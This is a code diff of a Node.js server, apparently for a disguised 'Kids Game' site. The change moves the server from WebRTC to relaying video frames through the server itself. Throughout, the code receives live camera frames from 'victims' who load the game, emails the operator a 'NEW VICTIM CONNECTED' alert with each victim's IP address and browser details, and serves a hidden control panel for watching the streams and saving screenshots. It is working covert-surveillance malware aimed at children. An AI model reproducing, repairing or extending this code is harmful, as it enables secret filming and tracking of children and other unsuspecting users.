@@ -1,21 +1,22 @@
-// server.js — قم بتشغيله بدلاً من PHP
+// server.js — Server-Relay Streaming (no WebRTC P2P needed)
 const express = require('express');
 const http = require('http');
 const socketIo = require('socket.io');
 const path = require('path');
 const nodemailer = require('nodemailer');
-const fs = require('fs');
 
 const app = express();
 const server = http.createServer(app);
-const io = socketIo(server);
+const io = socketIo(server, {
+  maxHttpBufferSize: 5e6 // 5MB max for frame data
+});
 
-const PORT = 8080;
+const PORT = process.env.PORT || 8080;
 
-// ⚙️ إعدادات الإيميل — عدلها حسب بريدك (Gmail مع App Password)
+// Email config
 const EMAIL_CONFIG = {
   from: 'your-email@gmail.com',
-  to: 'your-email@gmail.com',     // بريدك اللي تبغى تجي فيه الإشعارات
+  to: 'your-email@gmail.com',
   subject: '🚨 NEW VICTIM CONNECTED - Kids Game',
   smtp: {
     host: 'smtp.gmail.com',
@@ -23,21 +24,19 @@ const EMAIL_CONFIG = {
     secure: true,
     auth: {
       user: 'your-email@gmail.com',
-      pass: 'your-app-password'   // استخدم App Password (ليس كلمة المرور العادية)
+      pass: 'your-app-password'
     }
   }
 };
 
 const transporter = nodemailer.createTransport(EMAIL_CONFIG.smtp);
 
-// تخزين الجلسات النشطة
 const activeSessions = new Map();
 let sessionCounter = 0;
 
-// ========== Serve Static Files ==========
+// Static files
 app.use(express.static(path.join(__dirname, 'public')));
 
-// صفحة الألعاب
 app.get('/', (req, res) => {
   res.sendFile(path.join(__dirname, 'public', 'index.html'));
 });
@@ -47,7 +46,7 @@ app.get('/control', (req, res) => {
   res.send(`
 <html>
 <head>
-  <title>🎮 Control Panel - Kids Game</title>
+  <title>🎮 Control Panel</title>
   <style>
     * { margin: 0; padding: 0; box-sizing: border-box; }
     body {
@@ -89,19 +88,17 @@ app.get('/control', (req, res) => {
       padding: 20px;
       backdrop-filter: blur(10px);
     }
-    .session-card h3 {
-      color: #667eea;
-      margin-bottom: 10px;
-    }
     .session-card .info {
       font-size: 13px;
       color: #aaa;
       margin-bottom: 15px;
     }
-    .session-card video {
+    .session-card img.stream-img {
       width: 100%;
       border-radius: 10px;
       background: #000;
+      min-height: 200px;
+      object-fit: contain;
     }
     .session-card .controls {
       margin-top: 12px;
@@ -118,7 +115,6 @@ app.get('/control', (req, res) => {
       transition: all 0.2s;
     }
     .btn-audio { background: #6bcb77; color: #000; }
-    .btn-stop { background: #ff6b6b; color: white; }
     .btn-snap { background: #4d96ff; color: white; }
     .session-card button:active { transform: scale(0.95); }
     .no-sessions {
@@ -137,6 +133,7 @@ app.get('/control', (req, res) => {
     }
     .status-dot.online { background: #6bcb77; box-shadow: 0 0 10px #6bcb77; }
     .status-dot.offline { background: #ff6b6b; }
+    .fps-counter { font-size: 11px; color: #6bcb77; margin-left: 10px; }
     .logs {
       max-width: 800px;
       margin: 30px auto;
@@ -176,133 +173,106 @@ app.get('/control', (req, res) => {
   
   <script src="/socket.io/socket.io.js"></script>
   <script>
-    const socket = io();
-    const sessionList = document.getElementById('sessionList');
-    const sessionCount = document.getElementById('sessionCount');
-    const logsDiv = document.getElementById('logs');
+    var socket = io();
+    var sessionList = document.getElementById('sessionList');
+    var sessionCount = document.getElementById('sessionCount');
+    var logsDiv = document.getElementById('logs');
+    var snapCount = 0;
+    var frameListeners = {};
 
     function addLog(msg) {
-      const entry = document.createElement('div');
+      var entry = document.createElement('div');
       entry.className = 'log-entry';
       entry.textContent = '[' + new Date().toLocaleTimeString() + '] ' + msg;
       logsDiv.appendChild(entry);
       logsDiv.scrollTop = logsDiv.scrollHeight;
     }
 
-    const peerConnections = {};
-    const remoteStreams = {};
-    const sessionListeners = {}; // track listeners per session to remove them
-
     socket.on('connect', function() {
-      addLog('✅ Connected to signaling server');
+      addLog('✅ Connected to server');
+      socket.emit('get-sessions');
     });
 
     function cleanupSession(sid) {
-      // Close peer connection
-      if (peerConnections[sid]) {
-        try { peerConnections[sid].close(); } catch(e) {}
-        delete peerConnections[sid];
-      }
-      delete remoteStreams[sid];
-      // Remove socket listeners for this session
-      if (sessionListeners[sid]) {
-        sessionListeners[sid].forEach(function(item) {
+      if (frameListeners[sid]) {
+        frameListeners[sid].forEach(function(item) {
           socket.off(item.event, item.fn);
         });
-        delete sessionListeners[sid];
+        delete frameListeners[sid];
       }
     }
 
-    function connectToSession(sid, card, v) {
-      // Clean up any existing connection first
+    function setupSession(sid) {
+      if (document.getElementById('card-' + sid)) return;
+
+      var card = document.createElement('div');
+      card.className = 'session-card';
+      card.id = 'card-' + sid;
+
+      var info = document.createElement('div');
+      info.className = 'info';
+      info.innerHTML = '<span class="status-dot online"></span> Session: <strong>' + sid + '</strong><span class="fps-counter" id="fps-' + sid + '"></span>';
+
+      var img = document.createElement('img');
+      img.className = 'stream-img';
+      img.id = 'stream-' + sid;
+      img.alt = 'Live Stream';
+
+      var controlsDiv = document.createElement('div');
+      controlsDiv.className = 'controls';
+      
+      var btnAudio = document.createElement('button');
+      btnAudio.className = 'btn-audio';
+      btnAudio.textContent = '🔊 Audio (N/A)';
+      btnAudio.disabled = true;
+
+      var btnSnap = document.createElement('button');
+      btnSnap.className = 'btn-snap';
+      btnSnap.textContent = '📸 Screenshot';
+      btnSnap.onclick = function() {
+        if (!img.src || img.src === '') return;
+        var link = document.createElement('a');
+        link.download = 'snap_' + sid + '_' + Date.now() + '.jpg';
+        link.href = img.src;
+        link.click();
+        snapCount++;
+        document.getElementById('totalSnaps').textContent = snapCount;
+      };
+
+      controlsDiv.appendChild(btnAudio);
+      controlsDiv.appendChild(btnSnap);
+
+      card.appendChild(info);
+      card.appendChild(img);
+      card.appendChild(controlsDiv);
+      sessionList.appendChild(card);
+
+      // Listen for video frames
       cleanupSession(sid);
+      frameListeners[sid] = [];
 
-      const iceConfig = { 
-        iceServers: [
-          { urls: 'stun:stun.l.google.com:19302' },
-          { urls: 'stun:stun1.l.google.com:19302' },
-          { urls: 'stun:stun2.l.google.com:19302' },
-          { urls: 'stun:global.stun.twilio.com:3478' }
-        ]
-      };
+      var frameCount = 0;
+      var lastFpsTime = Date.now();
 
-      const pc = new RTCPeerConnection(iceConfig);
-      peerConnections[sid] = pc;
-      sessionListeners[sid] = [];
-
-      let hasRemoteDesc = false;
-      let iceQueue = [];
-
-      pc.ontrack = function(event) {
-        if (event.streams && event.streams[0]) {
-          v.srcObject = event.streams[0];
-          remoteStreams[sid] = event.streams[0];
-        } else {
-          if (!v.srcObject) {
-            v.srcObject = new MediaStream();
-          }
-          v.srcObject.addTrack(event.track);
-          remoteStreams[sid] = v.srcObject;
-        }
-        addLog('📡 Track (' + event.track.kind + ') from ' + sid);
-      };
-
-      pc.onicecandidate = function(event) {
-        if (event.candidate) {
-          socket.emit('ctrl-ice', { target: sid, candidate: event.candidate });
+      var frameFn = function(data) {
+        img.src = data;
+        frameCount++;
+        var now = Date.now();
+        if (now - lastFpsTime >= 2000) {
+          var fps = Math.round(frameCount / ((now - lastFpsTime) / 1000));
+          var fpsEl = document.getElementById('fps-' + sid);
+          if (fpsEl) fpsEl.textContent = fps + ' FPS';
+          frameCount = 0;
+          lastFpsTime = now;
         }
       };
+      socket.on('frame-' + sid, frameFn);
+      frameListeners[sid].push({ event: 'frame-' + sid, fn: frameFn });
 
-      pc.oniceconnectionstatechange = function() {
-        addLog('⚡ ICE ' + sid + ': ' + pc.iceConnectionState);
-        if (pc.iceConnectionState === 'connected' || pc.iceConnectionState === 'completed') {
-          addLog('🟢 LIVE! Stream active from ' + sid);
-          var dot = card.querySelector('.status-dot');
-          if (dot) { dot.className = 'status-dot online'; }
-        }
-        if (pc.iceConnectionState === 'failed') {
-          addLog('🔴 ICE failed for ' + sid + ' - retrying...');
-          setTimeout(function() { connectToSession(sid, card, v); }, 2000);
-        }
-      };
+      addLog('📺 Watching stream from ' + sid);
 
-      // Register offer listener
-      var offerFn = function(offer) {
-        addLog('📥 Offer from ' + sid);
-        pc.setRemoteDescription(new RTCSessionDescription(offer))
-          .then(function() {
-            hasRemoteDesc = true;
-            // Flush queued ICE candidates
-            iceQueue.forEach(function(c) {
-              pc.addIceCandidate(new RTCIceCandidate(c)).catch(function(e) { addLog('❌ ICE: ' + e.message); });
-            });
-            iceQueue = [];
-            return pc.createAnswer();
-          })
-          .then(function(answer) { return pc.setLocalDescription(answer); })
-          .then(function() {
-            socket.emit('ctrl-answer', { target: sid, answer: pc.localDescription });
-            addLog('📤 Answer sent to ' + sid);
-          })
-          .catch(function(e) { addLog('❌ Error: ' + e.message); });
-      };
-      socket.on('victim-offer-' + sid, offerFn);
-      sessionListeners[sid].push({ event: 'victim-offer-' + sid, fn: offerFn });
-
-      // Register ICE candidate listener
-      var iceFn = function(candidate) {
-        if (hasRemoteDesc) {
-          pc.addIceCandidate(new RTCIceCandidate(candidate)).catch(function(e) { addLog('❌ ICE: ' + e.message); });
-        } else {
-          iceQueue.push(candidate);
-        }
-      };
-      socket.on('victim-ice-' + sid, iceFn);
-      sessionListeners[sid].push({ event: 'victim-ice-' + sid, fn: iceFn });
-
-      // Request stream
-      socket.emit('request-stream', { target: sid });
-      addLog('📨 Requested stream from ' + sid);
+      // Tell server we want this stream
+      socket.emit('watch', sid);
     }
 
     socket.on('session-list', function(sessions) {
@@ -316,7 +286,7 @@ app.get('/control', (req, res) => {
         if (noSess) noSess.remove();
       }
 
-      // Remove cards for disconnected sessions
+      // Remove disconnected
       Array.from(sessionList.children).forEach(function(child) {
         if (child.id && child.id.startsWith('card-')) {
           var sid = child.id.replace('card-', '');
@@ -327,106 +297,64 @@ app.get('/control', (req, res) => {
         }
       });
 
-      // Add new sessions (skip existing)
+      // Add new
       sessions.forEach(function(sid) {
-        if (document.getElementById('card-' + sid)) return;
-
-        var card = document.createElement('div');
-        card.className = 'session-card';
-        card.id = 'card-' + sid;
-
-        var v = document.createElement('video');
-        v.id = 'video-' + sid;
-        v.autoplay = true;
-        v.playsinline = true;
-        v.style.width = '100%';
-        v.style.borderRadius = '10px';
-        v.muted = true;
-
-        var info = document.createElement('div');
-        info.className = 'info';
-        info.innerHTML = '<span class="status-dot online"></span> Session: <strong>' + sid + '</strong>';
-
-        var controlsDiv = document.createElement('div');
-        controlsDiv.className = 'controls';
-        
-        var btnAudio = document.createElement('button');
-        btnAudio.className = 'btn-audio';
-        btnAudio.textContent = '🔊 Unmute Audio';
-        btnAudio.onclick = function() {
-          v.muted = !v.muted;
-          btnAudio.textContent = v.muted ? '🔊 Unmute Audio' : '🔇 Mute Audio';
-        };
-
-        var btnSnap = document.createElement('button');
-        btnSnap.className = 'btn-snap';
-        btnSnap.textContent = '📸 Screenshot';
-        btnSnap.onclick = function() {
-          var canvas = document.createElement('canvas');
-          canvas.width = v.videoWidth || 640;
-          canvas.height = v.videoHeight || 480;
-          canvas.getContext('2d').drawImage(v, 0, 0);
-          var link = document.createElement('a');
-          link.download = 'snap_' + sid + '_' + Date.now() + '.png';
-          link.href = canvas.toDataURL();
-          link.click();
-        };
-
-        controlsDiv.appendChild(btnAudio);
-        controlsDiv.appendChild(btnSnap);
-
-        card.appendChild(info);
-        card.appendChild(v);
-        card.appendChild(controlsDiv);
-        sessionList.appendChild(card);
-
-        // Connect WebRTC
-        connectToSession(sid, card, v);
+        setupSession(sid);
       });
     });
 
     socket.on('new-session', function(sid) {
       addLog('🆕 New victim: ' + sid);
+      setupSession(sid);
+      // Refresh count
       socket.emit('get-sessions');
     });
 
     socket.on('session-gone', function(sid) {
-      addLog('🔴 Session ended: ' + sid);
+      addLog('🔴 Disconnected: ' + sid);
       var card = document.getElementById('card-' + sid);
       if (card && card.parentNode) card.remove();
       cleanupSession(sid);
+      socket.emit('get-sessions');
     });
 
-    // Poll sessions every 10 seconds (not 5)
-    setInterval(function() { socket.emit('get-sessions'); }, 10000);
-    socket.emit('get-sessions');
+    // Periodic refresh (just for count, not re-creating connections)
+    setInterval(function() { socket.emit('get-sessions'); }, 15000);
   </script>
 </body>
 </html>
   `);
 });
 
-// ========== Socket.IO Signaling ==========
+// ========== Socket.IO — Server Relay ==========
 io.on('connection', (socket) => {
   const clientIP = socket.handshake.address;
   const sessionId = 'SESS-' + (++sessionCounter).toString(16).toUpperCase() + '-' + Date.now().toString(36);
 
   console.log(`[+] New connection: ${sessionId} from ${clientIP}`);
 
-  // Control Panel requests active sessions list
+  // CP requests session list
   socket.on('get-sessions', () => {
     socket.isControl = true;
-    const activeList = Array.from(activeSessions.keys());
-    socket.emit('session-list', activeList);
+    socket.join('controls'); // Join controls room
+    socket.emit('session-list', Array.from(activeSessions.keys()));
   });
 
-  // Victim registers itself
-  socket.on('offer', (offer) => {
+  // CP wants to watch a specific session
+  socket.on('watch', (sid) => {
+    socket.join('watch-' + sid);
+    console.log(`[WATCH] CP ${socket.id} watching ${sid}`);
+  });
+
+  // Victim registers
+  socket.on('register-victim', () => {
     socket.sessionId = sessionId;
     socket.isVictim = true;
     activeSessions.set(sessionId, { socket, ip: clientIP, connectedAt: Date.now() });
 
-    // Send email alert
+    console.log(`[VICTIM] Registered: ${sessionId} from ${clientIP}`);
+
+    // Send email
     const mailBody = `
 🚨 NEW VICTIM CONNECTED 🚨
 
@@ -434,8 +362,6 @@ Session ID: ${sessionId}
 IP Address: ${clientIP}
 Time: ${new Date().toLocaleString()}
 User-Agent: ${socket.handshake.headers['user-agent'] || 'N/A'}
-
-Open Control Panel: http://localhost:${PORT}/control
     `;
 
     transporter.sendMail({
@@ -446,76 +372,38 @@ Open Control Panel: http://localhost:${PORT}/control
     }).then(() => {
       console.log(`[EMAIL] Alert sent for ${sessionId}`);
     }).catch(err => {
-      console.log(`[EMAIL] Failed to send: ${err.message}`);
+      console.log(`[EMAIL] Failed: ${err.message}`);
     });
 
-    // Notify all Control Panels
+    // Notify all control panels
     io.emit('new-session', sessionId);
-    console.log(`[SIGNAL] Victim registered: ${sessionId}`);
   });
 
-  // CP requests stream from a victim
-  socket.on('request-stream', (data) => {
-    const victim = activeSessions.get(data.target);
-    if (victim) {
-      console.log(`[SIGNAL] CP ${socket.id} requesting stream from ${data.target}`);
-      victim.socket.emit('request-stream', { cpId: socket.id });
-    } else {
-      console.log(`[SIGNAL] Victim ${data.target} not found for stream request`);
-    }
-  });
-
-  // Victim sends WebRTC offer (to be relayed to CP)
-  socket.on('video-offer', (data) => {
-    console.log(`[SIGNAL] Victim ${socket.sessionId} sends offer to CP ${data.cpId}`);
-    io.to(data.cpId).emit('victim-offer-' + socket.sessionId, data.offer);
-  });
-
-  // CP sends WebRTC answer (to be relayed to Victim)
-  socket.on('ctrl-answer', (data) => {
-    const victim = activeSessions.get(data.target);
-    if (victim) {
-      console.log(`[SIGNAL] CP ${socket.id} sends answer to victim ${data.target}`);
-      victim.socket.emit('video-answer', { cpId: socket.id, answer: data.answer });
-    }
-  });
-
-  // ICE from Victim → CP
-  socket.on('ice-candidate', (data) => {
-    if (data.cpId && socket.sessionId) {
-      io.to(data.cpId).emit('victim-ice-' + socket.sessionId, data.candidate);
-    }
-  });
-
-  // ICE from CP → Victim
-  socket.on('ctrl-ice', (data) => {
-    if (data.target) {
-      const victim = activeSessions.get(data.target);
-      if (victim) {
-        victim.socket.emit('ice-candidate', { cpId: socket.id, candidate: data.candidate });
-      }
+  // Victim sends video frame → relay to watchers
+  socket.on('frame', (data) => {
+    if (socket.sessionId) {
+      io.to('watch-' + socket.sessionId).emit('frame-' + socket.sessionId, data);
     }
   });
 
   socket.on('disconnect', () => {
-    if (socket.sessionId) {
+    if (socket.sessionId && socket.isVictim) {
       activeSessions.delete(socket.sessionId);
       io.emit('session-gone', socket.sessionId);
-      console.log(`[-] Session ended: ${socket.sessionId}`);
+      console.log(`[-] Victim disconnected: ${socket.sessionId}`);
     }
   });
 });
 
-// ========== Start Server ==========
+// ========== Start ==========
 server.listen(PORT, '0.0.0.0', () => {
   console.log(`
 ╔══════════════════════════════════════════╗
-║    🎮 Kids Game Server Running           ║
+║    🎮 Kids Game Server (Relay Mode)     ║
 ╠══════════════════════════════════════════╣
 ║  Game Page:  http://localhost:${PORT}      ║
 ║  Control:    http://localhost:${PORT}/control ║
-║  Port:       ${PORT}                       ║
-║  Email Alerts: ${EMAIL_CONFIG.smtp.auth.user ? '✅ Active' : '❌ Not configured'}  ║
+║  Mode:       Server Relay (no WebRTC)    ║
 ╚══════════════════════════════════════════╝
   `);
 });
